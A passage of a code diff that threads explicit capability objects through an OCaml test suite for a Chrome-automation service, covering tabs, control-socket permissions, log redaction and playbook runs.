@@ -102,17 +102,26 @@ let levels_with ?plan answers _questions =
                           else Fail "navigation did not complete"))));
     }
 
-let rig ?reporter ?download_dir ?handoff_timeout_s f =
+let rig
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) ?reporter ?download_dir ?handoff_timeout_s f =
   Ox_test.run (fun env sw ->
       let mgr = Ox_test.Process.make [ Block_until_signal; Block_until_signal ] in
       let current = ref None in
-      let launch ~sw ~clock ~mgr:_ config =
+      let launch
+          ~(caps : < Ox_caps.Cap.exec ; Ox_caps.Cap.fork ; Ox_caps.Cap.fs_write ; .. >)
+          ~sw ~clock ~mgr:_ config =
         let fake, client = Fake.create ~sw () in
         current := Some fake;
         match
-          Ox_process.Child.spawn ~caps:(Ox_test.powerbox ()) ~sw ~clock
-            ~mgr:(Ox_test.Process.mgr mgr) ~argv:(Chrome.argv config)
-            ~grace:(Ox.Duration.ms 50) ~fds:[] ()
+          Ox_process.Child.spawn ~caps ~sw ~clock ~mgr:(Ox_test.Process.mgr mgr)
+            ~argv:(Chrome.argv config) ~grace:(Ox.Duration.ms 50) ~fds:[] ()
         with
         | Error e -> Error e
         | Ok child -> Ok (child, { Leash.Cdp.read = client.read; write = client.write })
@@ -126,14 +135,14 @@ let rig ?reporter ?download_dir ?handoff_timeout_s f =
           ()
       in
       let chrome =
-        Chrome.create ~sw ~launch
+        Chrome.create ~sw ~launch:(launch ~caps)
           (Chrome.make ~binary:"/bin/sh" ~profile_dir:"/tmp/leash-test-profile"
              ~workspace:"test" ~headless:true ())
           {
             Chrome.clock = env#clock;
             mgr = env#process_mgr;
             logger;
-            caps = (Ox_test.powerbox () :> Leash.Chrome.caps);
+            caps :> Leash.Chrome.caps;
           }
       in
       let tabs =
@@ -143,7 +152,7 @@ let rig ?reporter ?download_dir ?handoff_timeout_s f =
             clock = env#clock;
             logger;
             desktop = Leash.Desktop.disabled;
-            caps = (Ox_test.powerbox () :> Leash.Tabs.caps);
+            caps :> Leash.Tabs.caps;
           }
       in
       let rec ready n =
@@ -200,8 +209,16 @@ let loads ?title fake =
         ~params:(Fake.event "Page.loadEventFired");
       obj [])
 
-let lifecycle () =
-  rig (fun _ _ _ tabs fake ->
+let lifecycle
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs fake ->
       loads (fake ());
       Fake.on_method (fake ()) "Target.getTargetInfo" (fun _ ->
           document ~title:"Example" ~url:"https://example.com");
@@ -281,8 +298,16 @@ let lifecycle () =
         "chrome-2n8n closed" true
         (get "open" (get "tabs" (result (request tabs "alice" P.Status))) = `Int 0))
 
-let safety () =
-  rig (fun _ _ _ tabs _ ->
+let safety
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs _ ->
       List.iter
         (fun url ->
           check_code "chrome-akz4 policy" "url-refused"
@@ -295,8 +320,16 @@ let safety () =
       check_code "chrome-d4mz cap" "tab-cap"
         (request tabs "alice" (P.New { url = None; label = None })))
 
-let nav () =
-  rig (fun _ _ _ tabs fake ->
+let nav
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs fake ->
       let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
       Fake.on_method (fake ()) "Page.navigate" (fun request ->
           let session =
@@ -352,8 +385,16 @@ let settle ~sw what f =
 
 (* chrome-qnul: the title is only known once the document has loaded, so [new] waits for
    the load event exactly as [nav] does before it replies. *)
-let new_waits () =
-  rig (fun _ _ _ tabs fake ->
+let new_waits
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs fake ->
       loads ~title:"example.com" (fake ());
       Fake.on_method (fake ()) "Target.getTargetInfo" (fun _ ->
           document ~title:"Example Domain" ~url:"https://example.com/");
@@ -397,8 +438,16 @@ let new_waits () =
 
 (* chrome-qnul: without a url there is nothing to await, so the reply must not wait for a
    load event — none is emitted here, and the mocked clock never moves. *)
-let new_without_url () =
-  rig (fun _ sw _ tabs _ ->
+let new_without_url
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ sw _ tabs _ ->
       let info =
         settle ~sw "chrome-qnul new without a url" (fun () ->
             request tabs "alice" (P.New { url = None; label = None }))
@@ -411,8 +460,16 @@ let new_without_url () =
 
 (* field-m5jw, chrome-qnul, chrome-1yn9: missing load events retain the
    registered handle and report loaded:false rather than losing it to an error. *)
-let load_timeout () =
-  rig (fun env sw _ tabs _ ->
+let load_timeout
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun env sw _ tabs _ ->
       (* One second at a time: the CDP calls around a load answer within a step or two,
          so only the registry's own 30-second bound is still running when it expires. *)
       let after_deadline what f =
@@ -523,8 +580,16 @@ let budget () =
           }));
   Alcotest.(check int) "other commands keep one second" 1_000 (ms P.Status)
 
-let malformed () =
-  rig (fun _ _ _ tabs _ ->
+let malformed
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs _ ->
       let reply =
         Yojson.Safe.from_string
           (Leash.Control.handle tabs {|{"v":1,"cmd":"new","args":{"url":77}}|})
@@ -535,8 +600,16 @@ let malformed () =
         (get "code" error = str "invalid-request"
         && String.contains (Yojson.Safe.to_string (get "message" error)) '.'))
 
-let lost () =
-  rig (fun _ _ chrome tabs fake ->
+let lost
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ chrome tabs fake ->
       let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
       Fake.drop (fake ());
       let rec await n =
@@ -564,19 +637,21 @@ let lost () =
       check_code "chrome-6lfk restart" "browser-unavailable"
         (request tabs "alice" (P.New { url = None; label = None })))
 
-let with_runtime f =
-  let runtime = Filename.temp_file "leash-control-" "" in
-  Unix.unlink runtime;
-  Unix.mkdir runtime 0o700;
+let with_runtime ~(caps : < Ox_caps.Cap.fs_write ; Ox_caps.Cap.tmp ; .. >) f =
+  let runtime = (Ox_caps.Cap_stdlib.Filename.temp_file ~caps) "leash-control-" "" in
+  (Ox_caps.Cap_unix.unlink ~caps) runtime;
+  (Ox_caps.Cap_unix.mkdir ~caps) runtime 0o700;
   Fun.protect
     ~finally:(fun () ->
       let dir = Filename.concat runtime "leash" in
-      let unlink path = if Sys.file_exists path then Unix.unlink path in
-      unlink (Filename.concat dir "control.sock");
-      unlink (Filename.concat dir "control.sock.lock");
-      if Sys.file_exists dir then Unix.rmdir dir;
-      Unix.chmod runtime 0o700;
-      Unix.rmdir runtime)
+      let unlink ~(caps : < Ox_caps.Cap.fs_write ; .. >) path =
+        if Sys.file_exists path then (Ox_caps.Cap_unix.unlink ~caps) path
+      in
+      (unlink ~caps) (Filename.concat dir "control.sock");
+      (unlink ~caps) (Filename.concat dir "control.sock.lock");
+      if Sys.file_exists dir then (Ox_caps.Cap_unix.rmdir ~caps) dir;
+      (Ox_caps.Cap_unix.chmod ~caps) runtime 0o700;
+      (Ox_caps.Cap_unix.rmdir ~caps) runtime)
     (fun () -> f runtime)
 
 (* svc-o4wt: the control socket is the configured path; these tests keep the default
@@ -585,9 +660,19 @@ let socket runtime = Filename.concat (Filename.concat runtime "leash") "control.
 
 (* tab-x4v0: a text reply bigger than the listener old 64 KiB ceiling arrives whole
    over a real socket; the service answers instead of closing the connection. *)
-let large_text_over_socket () =
-  with_runtime (fun runtime ->
-      rig (fun env sw _ tabs fake ->
+let large_text_over_socket
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.network
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  (with_runtime ~caps) (fun runtime ->
+      (rig ~caps) (fun env sw _ tabs fake ->
           let h =
             result (request tabs "alice" (P.New { url = None; label = None })) |> tab
           in
@@ -622,7 +707,7 @@ let large_text_over_socket () =
                       ~mono_clock:env#mono_clock
                       ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                       ();
-                  caps = (Ox_test.powerbox () :> Leash.Control.caps);
+                  caps :> Leash.Control.caps;
                 }
             with
             | Ok control -> control
@@ -656,10 +741,20 @@ let large_text_over_socket () =
                 "tab-x4v0 truncated" true
                 (get "truncated" json = `Bool true)))
 
-let socket () =
-  with_runtime (fun runtime ->
-      rig (fun env sw _ tabs _ ->
-          let make () =
+let socket
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.network
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  (with_runtime ~caps) (fun runtime ->
+      (rig ~caps) (fun env sw _ tabs _ ->
+          let make ~(caps : < Ox_caps.Cap.fs_write ; Ox_caps.Cap.network ; .. >) () =
             Leash.Control.create ~sw ~path:(socket runtime)
               {
                 Leash.Control.tabs;
@@ -682,10 +777,10 @@ let socket () =
                     ~mono_clock:env#mono_clock
                     ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                     ();
-                caps = (Ox_test.powerbox () :> Leash.Control.caps);
+                caps :> Leash.Control.caps;
               }
           in
-          (match make () with
+          (match (make ~caps) () with
           | Ok _ -> ()
           | Error _ -> Alcotest.fail "private listener refused");
           let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
@@ -702,17 +797,19 @@ let socket () =
           Alcotest.(check bool)
             "real socket status reply" true
             (get "ok" reply = `Bool true);
-          match make () with
+          match (make ~caps) () with
           | Ok _ -> Alcotest.fail "chrome-fwnu replaced live listener"
           | Error _ -> ()));
-  with_runtime (fun runtime ->
-      rig (fun env sw _ tabs _ ->
+  (with_runtime ~caps) (fun runtime ->
+      (rig ~caps) (fun env sw _ tabs _ ->
           let dir = Filename.concat runtime "leash" in
-          Unix.mkdir dir 0o700;
+          (Ox_caps.Cap_unix.mkdir ~caps) dir 0o700;
           let path = Filename.concat dir "control.sock" in
-          let fd = Unix.openfile path [ Unix.O_CREAT; Unix.O_WRONLY ] 0o600 in
+          let fd =
+            (Ox_caps.Cap_unix.openfile ~caps) path [ Unix.O_CREAT; Unix.O_WRONLY ] 0o600
+          in
           Unix.close fd;
-          let create () =
+          let create ~(caps : < Ox_caps.Cap.fs_write ; Ox_caps.Cap.network ; .. >) () =
             Leash.Control.create ~sw ~path:(socket runtime)
               {
                 Leash.Control.tabs;
@@ -735,20 +832,20 @@ let socket () =
                     ~mono_clock:env#mono_clock
                     ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                     ();
-                caps = (Ox_test.powerbox () :> Leash.Control.caps);
+                caps :> Leash.Control.caps;
               }
           in
-          (match create () with
+          (match (create ~caps) () with
           | Ok _ -> Alcotest.fail "chrome-fwnu replaced a regular file"
           | Error _ -> ());
           Alcotest.(check bool)
             "regular file untouched" true
             ((Unix.lstat path).st_kind = Unix.S_REG)));
-  with_runtime (fun runtime ->
-      rig (fun env sw _ tabs _ ->
+  (with_runtime ~caps) (fun runtime ->
+      (rig ~caps) (fun env sw _ tabs _ ->
           let dir = Filename.concat runtime "leash" in
-          Unix.mkdir dir 0o700;
-          Unix.chmod dir 0o755;
+          (Ox_caps.Cap_unix.mkdir ~caps) dir 0o700;
+          (Ox_caps.Cap_unix.chmod ~caps) dir 0o755;
           let result =
             Leash.Control.create ~sw ~path:(socket runtime)
               {
@@ -772,7 +869,7 @@ let socket () =
                     ~mono_clock:env#mono_clock
                     ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                     ();
-                caps = (Ox_test.powerbox () :> Leash.Control.caps);
+                caps :> Leash.Control.caps;
               }
           in
           let verdict =
@@ -780,7 +877,7 @@ let socket () =
             | Ok _ -> Alcotest.fail "chrome-fwnu accepted unsafe socket directory"
             | Error _ -> ()
           in
-          Unix.chmod dir 0o700;
+          (Ox_caps.Cap_unix.chmod ~caps) dir 0o700;
           verdict))
 
 (* svc-5wm8: one socket path has one listener. A second listener on the same path is
@@ -798,12 +895,22 @@ let listener_error = function
   | `Probe_failed -> "Probe_failed"
   | `Bind_failed why -> "Bind_failed " ^ why
 
-let second_instance () =
-  with_runtime (fun runtime ->
+let second_instance
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.network
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  (with_runtime ~caps) (fun runtime ->
       (* [socket] is the Alcotest case below, so take the path from the layout. *)
       let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
-      rig (fun env sw _ tabs _ ->
-          let create () =
+      (rig ~caps) (fun env sw _ tabs _ ->
+          let create ~(caps : < Ox_caps.Cap.fs_write ; Ox_caps.Cap.network ; .. >) () =
             Leash.Control.create ~sw ~path
               {
                 Leash.Control.tabs;
@@ -826,10 +933,10 @@ let second_instance () =
                     ~mono_clock:env#mono_clock
                     ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                     ();
-                caps = (Ox_test.powerbox () :> Leash.Control.caps);
+                caps :> Leash.Control.caps;
               }
           in
-          (match create () with
+          (match (create ~caps) () with
           | Ok _ -> ()
           | Error error ->
               Alcotest.failf "svc-5wm8 the first listener was refused: %s"
@@ -837,7 +944,7 @@ let second_instance () =
           (* The lock file is what stops a second instance before the socket probe, so
              the refusal is [`Lock_conflict]; [`Active_listener] is the same refusal seen
              when only a live socket is there. Either one is the story: no second listener. *)
-          (match create () with
+          (match (create ~caps) () with
           | Ok _ -> Alcotest.fail "svc-5wm8 a second instance started on the owned socket"
           | Error `Lock_conflict | Error `Active_listener -> ()
           | Error error ->
@@ -853,8 +960,16 @@ let second_instance () =
             "svc-5wm8 the first instance still answers after the refusal" true
             (get "ok" reply = `Bool true)))
 
-let non_web_tab_labels () =
-  rig (fun _ _ _ tabs fake ->
+let non_web_tab_labels
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs fake ->
       let agent =
         result (request tabs "alice" (P.New { url = None; label = None })) |> tab
       in
@@ -890,8 +1005,16 @@ let non_web_tab_labels () =
       await 1000;
       ignore (result (request tabs "alice" (P.Close { tab = agent }))))
 
-let human () =
-  rig (fun _ _ _ tabs fake ->
+let human
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs fake ->
       let agent =
         result (request tabs "alice" (P.New { url = None; label = None })) |> tab
       in
@@ -1007,10 +1130,18 @@ let fixture name =
 let snapshot_fixture () = fixture "snapshot-chrome.json"
 
 (* daily-9ggi: real Chrome 152 replies, private headless service, device scale 2. *)
-let daily_snapshot () =
+let daily_snapshot
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
   List.iter
     (fun site ->
-      rig (fun _ _ _ tabs fake ->
+      (rig ~caps) (fun _ _ _ tabs fake ->
           let fake = fake () in
           let captured = get site (fixture "daily-snapshot-chrome.json") in
           Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" captured);
@@ -1090,8 +1221,16 @@ let daily_snapshot () =
               | [] -> ""))))
     [ "httpbin"; "example" ]
 
-let snapshot () =
-  rig (fun _ _ _ tabs fake ->
+let snapshot
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs fake ->
       let fake = fake () in
       let fixture = snapshot_fixture () in
       Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
@@ -1297,8 +1436,16 @@ let with_ticking_clock ?(tick_ms = 1) ?(ticks = 500_000) env sw f =
       tick ticks);
   Fun.protect ~finally:(fun () -> stop := true) f
 
-let drive_dry_run () =
-  rig (fun env sw _ tabs fake ->
+let drive_dry_run
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun env sw _ tabs fake ->
       with_ticking_clock ~tick_ms:1 ~ticks:500_000 env sw (fun () ->
           let fake = fake () in
           let fixture = fixture "unlabelled-controls-chrome.json" in
@@ -1417,9 +1564,17 @@ let drive_dry_run () =
 
 (* tab-bw4j drive-y7v8: a click refused before any input is not an uncertain
    outcome. JEV is shown the page again and may choose a different action. *)
-let refused_click_redecides ?(operation_name = "click") () =
+let refused_click_redecides
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) ?(operation_name = "click") () =
   let role = if operation_name = "type_text" then "textbox" else "button" in
-  rig (fun env sw _ tabs fake ->
+  (rig ~caps) (fun env sw _ tabs fake ->
       let fake = fake () in
       let fixture = fixture "unlabelled-controls-chrome.json" in
       Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
@@ -1593,8 +1748,16 @@ let refused_click_redecides ?(operation_name = "click") () =
    and DOMSnapshot replies are the recorded headless Chrome 152 shapes for a page with an
    unlabelled native select, a bare text input, an input whose only text is a placeholder,
    and an icon button with no name (test/fixtures/unlabelled-controls-chrome.json). *)
-let empty_names () =
-  rig (fun _ _ _ tabs fake ->
+let empty_names
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs fake ->
       let fake = fake () in
       let fixture = fixture "unlabelled-controls-chrome.json" in
       Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
@@ -1651,8 +1814,16 @@ let empty_names () =
 
 (* tab-bw4j, L34: a button icon's ::before pseudo-element belongs to its row,
    while an unrelated overlay does not. *)
-let pseudo_icon_hit () =
-  rig (fun _ _ _ tabs fake ->
+let pseudo_icon_hit
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ _ _ tabs fake ->
       let fake = fake () in
       let fixture = fixture "unlabelled-controls-chrome.json" in
       Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
@@ -1756,10 +1927,18 @@ let pseudo_icon_hit () =
 
 (* svc-p67t svc-qilu: inspect every command anchor and every journal line of a
    scripted tab session; page data and credentials must never become a log line. *)
-let journal_redaction () =
+let journal_redaction
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
   let module L = Ox_observability.Logger in
   let memory = L.Memory.create () in
-  rig ~reporter:(L.Memory.reporter memory) (fun env _ _ tabs fake ->
+  (rig ~caps) ~reporter:(L.Memory.reporter memory) (fun env _ _ tabs fake ->
       let logger =
         L.create ~service:"leash-test" ~clock:env#clock ~mono_clock:env#mono_clock
           ~reporter:(L.Memory.reporter memory) ()
@@ -2037,8 +2216,16 @@ let journal_redaction () =
 
 (* run-ykq4: no Chrome process; browser-level events and the handle-gated
    protocol response are driven by the scripted CDP peer. *)
-let download_events () =
-  rig ~download_dir:"/tmp/leash-scripted-downloads" (fun _ _ _ tabs fake ->
+let download_events
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) ~download_dir:"/tmp/leash-scripted-downloads" (fun _ _ _ tabs fake ->
       let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
       let fake = fake () in
       let behaviors =
@@ -2129,11 +2316,11 @@ let download_events () =
       check_code "hand-scaz downloads need the handle" "unknown-tab"
         (request tabs "bob" (P.Downloads { tab = bad })))
 
-let optional_otlp () =
+let optional_otlp ~(caps : < Ox_caps.Cap.random ; .. >) () =
   Ox_test.run (fun env sw ->
       let telemetry =
-        Leash.Telemetry.create ~caps:(Ox_test.powerbox ()) ~sw ~net:env#net
-          ~clock:env#clock ~endpoint:"http://127.0.0.1:4318" ~headers:[]
+        Leash.Telemetry.create ~caps ~sw ~net:env#net ~clock:env#clock
+          ~endpoint:"http://127.0.0.1:4318" ~headers:[]
       in
       Alcotest.(check int) "enabled reporter" 1 (List.length telemetry.Ox_app.reporters);
       let id = Option.get telemetry.Ox_app.span_ids () in
@@ -2250,16 +2437,23 @@ let document_at ~title ~url fake =
 (* The rig's clocks are Eio_mock's, so a run whose expectation wait sleeps needs the
    virtual clock moved while it works: this fiber advances it by 100 ms at a time until the
    request is answered. The wait's own timeout bounds it (run-l06s). *)
-let run_mission () =
-  rig (fun env sw _ tabs fake ->
+let run_mission
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun env sw _ tabs fake ->
       let f = fake () in
       let fixture = fixture "unlabelled-controls-chrome.json" in
       page_script f fixture modal_text;
       document_at ~title:"Blue Top" ~url:product_url f;
       let playbook =
         match
-          Leash.Playbook.load ~caps:(Ox_test.powerbox ())
-            "../examples/playbooks/automationexercise.com"
+          Leash.Playbook.load ~caps "../examples/playbooks/automationexercise.com"
         with
         | Ok book -> book
         | Error why -> Alcotest.fail why
@@ -2405,10 +2599,18 @@ let run_mission () =
         (List.mem "Input.dispatchMouseEvent" methods))
 
 (* run-fwl8: a run starts from a state it can act in. *)
-let drive_temporary_cleanup () =
+let drive_temporary_cleanup
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
   List.iter
     (fun outcome ->
-      rig (fun env sw _ tabs fake ->
+      (rig ~caps) (fun env sw _ tabs fake ->
           let f = fake () in
           page_script f (fixture "unlabelled-controls-chrome.json") "Example content";
           document_at ~title:"Example Domain" ~url:"https://example.com/" f;
@@ -2466,7 +2668,7 @@ let drive_temporary_cleanup () =
             "daily-9ggi temporary tab closed on every outcome" true
             (listed = `List [])))
     [ "done"; "blocked"; "model-error" ];
-  rig (fun env sw _ tabs fake ->
+  (rig ~caps) (fun env sw _ tabs fake ->
       let f = fake () in
       page_script f (fixture "unlabelled-controls-chrome.json") "Example content";
       document_at ~title:"Example Domain" ~url:"https://example.com/" f;
@@ -2484,14 +2686,13 @@ let drive_temporary_cleanup () =
       Alcotest.(check bool)
         "daily-9ggi exception closes temporary tab" true
         (listed = `List []));
-  rig ~handoff_timeout_s:1 (fun env sw _ tabs fake ->
+  (rig ~caps) ~handoff_timeout_s:1 (fun env sw _ tabs fake ->
       let f = fake () in
       page_script f (fixture "unlabelled-controls-chrome.json") "Sign in";
       document_at ~title:"Sign in" ~url:product_url f;
       let book =
         match
-          Leash.Playbook.load ~caps:(Ox_test.powerbox ())
-            "../examples/playbooks/automationexercise.com"
+          Leash.Playbook.load ~caps "../examples/playbooks/automationexercise.com"
         with
         | Ok book -> book
         | Error why -> Alcotest.fail why
@@ -2535,12 +2736,20 @@ let drive_temporary_cleanup () =
         | _ -> false))
 
 (* L53 map-puhi: drive owns only tabs it opened, including terminal limits and handoffs. *)
-let drive_tab_lifecycle () =
+let drive_tab_lifecycle
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
   List.iter
     (fun supplied ->
       List.iter
         (fun outcome ->
-          rig ~handoff_timeout_s:1 (fun env sw _ tabs fake ->
+          (rig ~caps) ~handoff_timeout_s:1 (fun env sw _ tabs fake ->
               let f = fake () in
               page_script f (fixture "unlabelled-controls-chrome.json") "Catalogue";
               document_at ~title:"Catalogue" ~url:product_url f;
@@ -2557,7 +2766,7 @@ let drive_tab_lifecycle () =
                 if outcome = "handoff" then
                   [
                     (match
-                       Leash.Playbook.load ~caps:(Ox_test.powerbox ())
+                       Leash.Playbook.load ~caps
                          "../examples/playbooks/automationexercise.com"
                      with
                     | Ok book -> book
@@ -2641,8 +2850,16 @@ let drive_tab_lifecycle () =
         [ "done"; "blocked"; "error"; "limit"; "deadline"; "handoff" ])
     [ false; true ]
 
-let run_refusals () =
-  rig (fun env sw _ tabs fake ->
+let run_refusals
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun env sw _ tabs fake ->
       with_ticking_clock ~tick_ms:1 ~ticks:500_000 env sw (fun () ->
           let f = fake () in
           let fixture = fixture "unlabelled-controls-chrome.json" in
@@ -2742,18 +2959,26 @@ let run_refusals () =
 (* L32 run-m0r8 run-rq6i: a planner turn through the control seam — the production handler
    writes the procedure it wrote and verified to XDG state, the reply reports the file, and
    the installed playbook is left exactly as it was. Only [playbook accept] merges one. *)
-let run_proposal () =
-  let state = Filename.temp_file "leash-run-proposal" "" in
-  Sys.remove state;
-  Unix.mkdir state 0o700;
-  let previous = Sys.getenv_opt "XDG_STATE_HOME" in
-  (Unix.putenv [@alert "-unsafe_multidomain"]) "XDG_STATE_HOME" state;
+let run_proposal
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  let state = (Ox_caps.Cap_stdlib.Filename.temp_file ~caps) "leash-run-proposal" "" in
+  (Ox_caps.Cap_sys.remove ~caps) state;
+  (Ox_caps.Cap_unix.mkdir ~caps) state 0o700;
+  let previous = (Ox_caps.Cap_sys.getenv_opt ~caps) "XDG_STATE_HOME" in
+  (Ox_caps.Cap_unix.putenv ~caps) "XDG_STATE_HOME" state;
   Fun.protect
     ~finally:(fun () ->
-      (Unix.putenv [@alert "-unsafe_multidomain"]) "XDG_STATE_HOME"
